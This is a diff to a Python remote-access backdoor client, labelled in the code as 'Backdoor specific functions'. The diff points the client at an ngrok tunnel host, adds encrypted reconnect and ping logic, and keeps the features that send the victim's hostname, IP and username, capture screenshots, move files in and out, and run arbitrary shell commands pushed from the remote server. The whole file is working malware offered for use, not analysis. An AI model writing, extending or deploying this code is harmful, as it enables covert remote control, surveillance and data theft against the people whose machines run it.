@@ -4,79 +4,163 @@ import time
 import subprocess
 import mss
 import rsa
-from cryptography.fernet import Fernet
+import threading
+import select
+from cryptography.fernet import Fernet 
 
 
 
-address = ("0.0.0.0", 3000)
+address = ("0.tcp.ngrok.io", 10883)
+ping_address = ("0.0.0.0", 4001)
 authed = False
 
+# Connection and data transfer related functions
+def establish_connection(address=address):
+    global server_con, authed, lck
+    public_key, private_key = rsa.newkeys(512)
+
+    while not authed:
+        try:
+            print("attempting to establish secure connection...")
+            server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server_con.connect((address[0],address[1]))
+
+            public_key_buff = public_key.save_pkcs1('PEM')
+            send(data=public_key_buff, sock=server_con, is_authed=authed)
+
+            encrypted_key_buff = recv(sock=server_con, is_authed=authed)
+            if encrypted_key_buff:
+                key = rsa.decrypt(encrypted_key_buff, private_key)
+                lck = Fernet(key)
+                authed = True
+                send_sys_info()
+                print(f"Connection Established! Server: {address[0]}:{address[1]}")
+                return server_con
+            else:
+                close_connection(sock=server_con)
+
+        except ConnectionRefusedError:
+            time.sleep(5)
+
+        # except:
+        #     print("Breaking")
+        #     close_connection(sock=server_con)
+
+
+def recv(time_out=None, sock=None, is_authed=None, buff_size=1024):
+    sock.settimeout(time_out)
+    data_size = sock.recv(12)
+    if not data_size:
+        return None
+
+    data_buff = bytes()
+    data_size = int(data_size)
+    while len(data_buff) < data_size:
+        data_buff += sock.recv(buff_size)
+
+    sock.settimeout(None)
+    return decrypt(data_buff) if is_authed else data_buff
+
+
+def send(data, sock=None, is_authed=None, header_size=12):
+    if not data:
+         return
+    
+    if is_authed:
+        data = encrypt(data)
+    data_size = f"{len(data):<{header_size}}"
+    sock.sendall(data_size.encode()+data)
+
+
+def encrypt(data):
+    return lck.encrypt(data)
+
+
+def decrypt(encrypted_data):
+    return lck.decrypt(encrypted_data)
+
+
+def close_connection(sock):
+    global authed 
+    authed = False
+    if sock:
+        sock.close()
+
+
+def reset_connection(sock=None, address=address):
+    close_connection(sock=sock)
+    return establish_connection(address=address)
+
+
+def ping(ping_address):
+    global server_con, authed
+    while True:
+        try:
+            ping_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            if not authed:
+                ping_server.connect(ping_address)
+                print("Pinging server...")
+                from base64 import b64encode
+                send(data=b64encode(b'ALIVE'), sock=ping_server, is_authed=authed)
+            else:
+                ping_server.shutdown(socket.SHUT_RDWR)
+                ping_server.close()
+                break
+
+        except:
+            pass
+        
+
+
+
+
+# Backdoor specific functions
 def take_screen_shot():
     if mss.mss().monitors:
         raw_pixels = mss.mss().grab(mss.mss().monitors[0])
         img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
-        send(img_data)
+        global server_con, authed
+        send(sock=server_con, data=img_data, is_authed=authed)
 
-    else:
-        send(b'')
-
-def get_info():
-    description = f"""Client Name: {os.uname().nodename}\nLocal IP: {socket.gethostbyname(os.uname().nodename)}\nUser: {os.getlogin()}\nPassword: {"Dunno🤷🏻‍♂️"}"""
-    send(description.encode())
-
-def recv(buff_size=1024):
-    data_buff = bytes()
-    data_size = server_con.recv(12)
-
-    if len(data_size) > 0:
-        data_size = int(data_size.decode().rstrip())
-    else:
-        return None
-
-    while len(data_buff) < data_size:
-        data_buff += server_con.recv(buff_size)
-        
-    return decrypt(data_buff) if authed else data_buff
-
-
-def send(data, header_size=12):
-    if authed:
-        data = encrypt(data)
-    data_size = f"{len(data):<{header_size}}"
-    server_con.sendall(data_size.encode()+data)
+def send_sys_info():
+    global server_con, authed
+    device_info = f"""Client Name: {os.uname().nodename}&Local IP: {socket.gethostbyname(os.uname().nodename)}&User: {os.getlogin()}&Password: {'Dunno🤷🏻‍♂️'}"""
+    send(sock=server_con, data=device_info.encode(), is_authed=authed)
 
 def upload_file(file_name):
+    global server_con, authed
     try:
-        with open(file_name, "rb") as file:
+        with open(f"{file_name}", "rb") as file:
             file_data = file.read()
-            send(file_data)
+            send(sock=server_con, data=file_data, is_authed=authed)
 
-    except:
-        print("Error opening file")
-        send(b'')
+    except FileNotFoundError:
+        print("Error, file not found")
 
 def download_file(file_name, file_path):
-    file_data = recv(buff_size=32768)
-    if not file_data:
-        print("Could not download file...")
-        return
-
     try:
-        file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
-        file.write(file_data)
-        file.close()
+        file_data = recv(buff_size=65538, time_out=15, sock=server_con, is_authed=authed)
+        
+        if file_data:
+            file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
+            file.write(file_data)
+            file.close()
+        else:
+            print("Error, couldn't download the file.")
+            
+    except socket.timeout:
+        print("Could not download file. Connection timed out.")
 
-    except OSError as e:
-        print(e)
 
 def open_shell():
+    global server_con, authed
     while True:
-        print("waiting for cmd...")
-        cmd = recv()
-        str_msg = b""
+        #clearprint("waiting for cmd...")
+        cmd = recv(sock=server_con, is_authed=authed) 
+        cmd_output_buff = b""
 
         if not cmd:
-            continue
+            break
 
         cmd = cmd.decode()
 
@@ -88,9 +172,9 @@ def open_shell():
             try:
                 os.chdir(dir)
             except FileNotFoundError as e:
-                str_msg = str(e).encode()
+                cmd_output_buff = str(e).encode()
             else:
-                str_msg = os.getcwd().encode()
+                cmd_output_buff = os.getcwd().encode()
 
         elif cmd[:2] == "dw":
             file_name = cmd[3:]
@@ -106,68 +190,48 @@ def open_shell():
 
         else:
             output = subprocess.Popen(f'{cmd}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
-            str_msg = output[0] + output[1] 
+            cmd_output_buff = output[0] + output[1]
+    
+        if not cmd_output_buff:
+            cmd_output_buff = b'%%NONE%%'
+        send(sock=server_con, data=cmd_output_buff, is_authed=authed)
 
 
-
-        send(str_msg)
-
-
-def encrypt(data):
-    return lck.encrypt(data)
-
-def decrypt(encrypted_data):
-    return lck.decrypt(encrypted_data)
-
-
-def establish_connection(address):
-    global server_con, authed, lck
-    public_key, private_key = rsa.newkeys(512)
-
-    print("Connecting...")
-    while not authed:
-        server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server_con.connect((address[0],address[1]))
-        print(f"Connected!\nServer: {address[0]}:{address[1]}")
-
-        public_key_buff = public_key.save_pkcs1('PEM')
-        send(public_key_buff)
-
-        key = rsa.decrypt(recv(), private_key)
-        lck = Fernet(key)
-        if lck:
-            send(lck.encrypt(b'\n\nOK\n\n'))
-            authed = True
-        
-
-def kill_connection():
-    server_con.shutdown(socket.SHUT_WR)
-    server_con.close()
-
+#program entry
 def main():
-    establish_connection(address)
-    get_info()
+    global server_con, authed, ping_address
+    server_con = establish_connection(address)
+    
+    while server_con:
+        try:
+            choice = recv(sock=server_con, is_authed=authed)
+            if not choice:
+                print("Connection to host lost...")
+                server_con = reset_connection()
 
-    while True:
-        choice = recv().decode()
-        if choice == "1":
-            print("Opening Shell...")
-            open_shell()
-        elif choice == "2":
-            take_screen_shot()
-        elif choice == "3":
-            pass
-        elif choice == "4":
-            keep_alive = recv().decode().lower()
-            if keep_alive == "y" or keep_alive == "yes":
-                server_con.shutdown(socket.SHUT_WR)
-                server_con.close()
-                time.sleep(5)
-                establish_connection(address)
-            else:
-                break
+            elif choice == b"1":
+                print("Opening Shell...")
+                open_shell()
 
+            elif choice == b"2":
+                take_screen_shot()
 
-    kill_connection()
+            elif choice == b"3":
+                pass
+
+            elif choice == b"4":
+                keep_alive = recv(sock=server_con, is_authed=authed).decode().lower()
+                if keep_alive == 'y' or keep_alive == 'yes':
+                    server_con = reset_connection(time_out=15)
+                else:
+                    break
+
+        except KeyboardInterrupt:
+            break
+
+        except:
+            server_con = reset_connection()
+
+    close_connection(sock=server_con)
 
 main()
